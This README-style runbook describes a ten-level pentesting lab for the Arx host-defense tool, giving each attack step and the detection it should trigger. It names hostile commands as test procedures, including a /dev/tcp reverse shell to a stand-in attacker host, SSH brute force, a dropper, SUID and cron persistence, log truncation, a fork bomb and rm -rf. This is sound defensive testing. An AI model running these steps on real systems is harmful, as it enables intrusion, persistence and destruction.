# Arx pentesting lab: levels 1 to 10

**Purpose:** to test Arx for real. Attack an isolated environment that Arx defends, from the most
trivial attempt up to trying to destroy it, and measure exactly what it detects, what it contains
and what gets past it. Gaps found here become roadmap work; nothing gets dressed up.

**Rules of engagement:** only against the lab environment (isolated network, no internet access in
the Docker mini-lab; host-only VLAN in the VM). Clean snapshot before each destructive level. Lab
tools are never used against third parties.

---

## Environments

### A. Docker mini-lab (fast; levels 1–6 and regressions)

Two containers on an internal network with no way out:

```bash
docker network create --internal arx-lab
# Victim: privileged Ubuntu 22.04 + Arx installed (deb or source), sealed baseline
# Attacker: kalilinux/kali-rolling with nmap/hydra/netcat
```

Honest limits: no full systemd or auditd, so Arx's sensors degrade to the base collectors (/proc,
ports, integrity, canaries). It's good for fast iteration, not as a final verdict.

### B. Real VM (levels 7–10 and final validation)

- Ubuntu 22.04 VM in UTM/Parallels/VMware (Mac) or VirtualBox, host-only network.
- **"Gold" snapshot:** Arx installed, `setup` done, baseline learned and sealed, canaries planted,
  `arx service install --enforce` active.
- Attacker: another VM (Kali) on the same host-only network.
- Restore the gold snapshot between levels. Level 10 IS EXPECTED to destroy the VM.

### C. Cloud range (future)

A pair of disposable VPSs for real outbound attacker traffic (TOR, a public lab C2). Only once A
and B are green.

---

## The 10 levels

| Level | Attack (procedure) | Expected Arx behavior | Passes if… |
|---|---|---|---|
| **1. Reconnaissance** | `nmap -sS` from the attacker | nft kernel trail (`inet arx scan4/6`: every incoming SYN, even to closed ports) → ≥8 ports/10 min → **Tier 1: IP block** | `port_scan` finding + element in `block_ipv4` + attacker can't reach it (curl times out). Without nftables it degrades to procfs (only ports that accept) |
| **2. Brute force** | 8 real failed SSH attempts (sshpass) | Incremental auth.log → ≥6 failures/10 min from one IP → **Tier 1: IP block** | `auth_bruteforce` finding + IP blocked |
| **3. Weak credential** | SSH login with a new user or default credential | `login_users` outside the baseline → high finding | New finding logged and alerted |
| **4. Service exploitation** | Vulnerable web app planted (RCE) → the attacker opens a new listener (e.g. 4444) | New port → Tier 1: REAL firewall block + log | Block rule visible (ufw/nft) and it auto-expires |
| **5. Dropper** | Download "malware" to `/tmp`, `chmod +x`, run it | New executable in a suspect directory (high) → immediate **SIGSTOP** | Process in state T; SIGCONT on expiry; reappearance → Tier 2 |
| **6. Reverse shell** | `bash -i >& /dev/tcp/attacker/4444` from the victim; the attacker sends commands over the channel | Connection→process correlation (socket inode → `/proc/<pid>/exe`): a shell with an outbound socket → **Tier 1: channel blocked with DROP in nftables + SIGSTOP of the owning process only** | The earlier command runs; after detection, another command does NOT arrive even if the shell is unfrozen, and it can't reconnect; another host `bash` stays intact; on expiry, the held command DOES arrive (truly reversible). General interpreters (python/perl) are left for F8 |
| **7. Escalation** | Plant a new SUID binary (`chmod u+s`) | SUID sweep + integrity → **crit** | Crit finding on the next SUID sweep |
| **8. Persistence** | Entry in cron/systemd/`authorized_keys` | Integrity drift → **crit → Tier 2** (human decides) → restore from the vault + intruder quarantined | Pending item authorized → hostile file out of place and preserved as evidence |
| **9. Anti-forensics** | Truncate logs + read sensitive files (canaries) | Canary: read detected (high, one-shot); **auth.log truncation → `log_tamper`** | Canary ✓ + `log_tamper` finding (same inode, smaller size) |
| **10. Total destruction** | Simulated ransomware (mass encryption in a decoy tree) + fork bomb + `rm -rf` over canaries; in a VM | **The safety brake trips**: Arx stops acting after 5 actions/hour, escalates everything to a human, mass critical alert | Breaker tripped + alerts sent + nothing irreversible done by Arx; the VM may die, which is why it's a VM |

**Level passed when:** the expected behavior happens AND evidence is left in `incidents.jsonl` /
`arx status`. A level with a GAP isn't a lab failure: it's the honest map of what's left to build
(and each gap already has a roadmap phase).

---

## The other labs

| Lab | What it adds | Command |
|---|---|---|
| **systemd** | Real `.deb`, `arx setup` through the console, the unit and its hardening, journald, `kill -9`, reboot and nftables `flush`, `ufw` with existing `allow` rules, the model from the service (its answer is simulated), control from the chat with a fake Telegram | `bash lab/systemd-lab.sh` |
| **Normal day** | No attacks: apt, services, logrotate, tmux, useradd, an in-house app, scp, all with `--enforce`. It measures whether Arx gets in the way and how much noise it makes. It's synthetic: a first number, not the metric | `bash lab/normal-day.sh` |
| **Level 10** | Encrypted canaries, a storm against the brake, a bounded fork bomb, log wiping, `kill -9`. What's measured: it stays up, alerts and does nothing irreversible | `bash lab/level10.sh` |
| **VM (Lima)** | Proof of origin, confinement and behavior watching on a real kernel, measured from a second VM: nginx from apt stays reachable; a stray `.deb` or an unowned unit gets its port blocked; a program of unproven origin keeps serving but can't reach the attacker, across a service restart and a real reboot; a watched service that starts talking somewhere new gets that connection cut; accepting gives the network back. Ubuntu 24.04, 22.04, or an unprivileged LXC container | `bash lab/lima-lab.sh` · `ARX_LIMA_VICTIM=arx-u22` · `ARX_LIMA_LXC=c1` |
| **Process watching (Lima)** | A fake web server starting a shell as `www-data` gets it frozen; a service starting a program it never started gets that process isolated without network; dozens of real SSH logins raise no sshd alarm | `bash lab/exec-lab.sh` |
| **sshd configuration (Lima)** | An AuthorizedKeysCommand script inside a `Match Group` block, just added: sshd runs it before authenticating on every login, and Arx freezes none; nor with `sshd -T` broken | `bash lab/sshd-config-lab.sh` |
| **Untrusted OpenSSH update (Lima)** | sshd loses outbound network but keeps DNS; an open session survives, new logins work, also after restarting sshd; accepting gives it all back | `bash lab/ssh-update-lab.sh` |
| **Uninstall (Lima)** | Stopping Arx or editing its unit is reported; `apt purge arx` leaves no drop-in, pin, unit, nftables table, config or state, and what was confined gets its network back | `bash lab/uninstall-lab.sh` |
| **Maintenance memory (Lima)** | Real APT/dpkg helpers start in a sibling slice; large-package streaming, serialization, timeout cleanup and fail-closed behavior are checked. A controlled 640 MiB helper is OOM-killed without killing Arx | `ARX_LIMA_VICTIM=arx-deb13 bash lab/maintenance-lab.sh` |
| **xz pattern (Lima)** | A real library injected into sshd runs a command before authentication: frozen within milliseconds before it can act, also a fork loop, and an outside SIGCONT can't wake it. Ubuntu 24.04 and Debian 13 (OpenSSH 10) | `bash lab/xz-lab.sh` |
| **DNS per service (Lima)** | A service learns its domains; a new one is reported, a machine-generated-looking one is high | `bash lab/dns-lab.sh` |
| **Libraries and secrets (Lima)** | A library in `/dev/shm` loaded into a service, or a service opening `/etc/shadow`: alert and no outbound network; a library from a package and a user reading shadow don't count | `bash lab/files-lab.sh` |
| **Supply chain (Lima)** | Signed updates from a vendor's own signed repository: one whose install script plants an SSH key, one whose unit calls home, and one of a library a service loads (the shape of the xz backdoor). Each service is confined or has the call cut, keeps serving, and is reported; accepting a version frees it | `bash lab/supply-chain-lab.sh` |

They use their own image, `lab/systemd/Dockerfile`, built only from the official `ubuntu:22.04` and
Ubuntu packages. With systemd as PID 1 in a privileged container, they share a kernel with Docker:
no auditd and no real kernel reboot. A real kernel and a real reboot are in the Lima lab; the level 7–10 runbook in `lab/vm/` still hasn't been run.

## Running

```bash
lab/docker-lab.sh        # TWO-container mini-lab: real L1, L2 and L6 (nmap/sshpass/
                         # reverse shell from the attacker) + L4,5,7,8,9 on the victim +
                         # containment check + tarpit phase (throttles instead of blocking)
lab/demo.sh              # short version with three attacks and Arx's real output (the README GIF)
```

The scoreboard prints PASS/FAIL per level. Levels 3 and 10 run in containers (L3 with a real sshd
here and in the systemd lab; L10 in `lab/level10.sh`); the VM in `lab/vm/` is still pending. Level 6
is validated in the network phase: the attacker listens with `nc`, the victim opens the classic
reverse shell, and Arx cuts the channel and suspends only the owner. Honest limit: reverse shells
through a general interpreter (python, perl, php) are left for the behavior sensors in F8.

**Tarpit (Core)** is validated in its own phase: with the `ip_response=tarpit` policy, Arx puts the
scanner's IP in the nft set `tarpit4` (not `block_ipv4`), and the effect is measured from the
attacker: `nmap` must stop seeing the open ports (measured: from 13 to 1 visible, and from 4061 to
2.1 connections/s). It only applies to scans: against SSH brute force it barely slows anything (from
56 to 34 passwords in 20 s), so that keeps being blocked. It isn't a classic connection-holding tarpit.

**Trap files (`hostile`):** the guard loop reads data the attacker controls. A dropper with a hostile
tail, a FIFO on its path, a dropper that deletes itself and names with non-UTF-8 bytes or newlines
must not hang or crash Arx, and the dropper must end up suspended.

**Identity (`identity`):** the account lock is tested against a real `sshd`. Sessions with and
without a terminal, a detached process and a root born from the session must die; the key and the
password must stop working, stay that way a month later and come back with `arx unlock`; and an
account the admin had already locked must stay locked. `identity-llm` does the same with the model's
verdict on a real login from the attacker (only its answer is simulated), and `identity-forged`
checks that a fake line in auth.log locks nobody.

**FORWARD:** a service published through DNAT, the way Docker does it. A blocked IP must not reach it.

**Proposals:** closing SSH passwords against a real `sshd`, measured from the attacker, with the key
still getting in, and undoing it.

**Vaccines (F17):** the channel is served from the attacker's container, to make it clear that the
signature is what counts: anything altered or signed with another key is discarded unopened. Two
hosts validate the same package on their own, and a rule that matches a binary on only one of them
is rejected only there.

Two harness lessons: `ncat` with closed stdin (`docker exec -d`) closes each connection at once,
which is why the C2 uses `nc`; and `ss -K` validates nothing on Docker Desktop, because its kernel
doesn't have `CONFIG_INET_DIAG_DESTROY` and the command returns 0 without cutting anything.
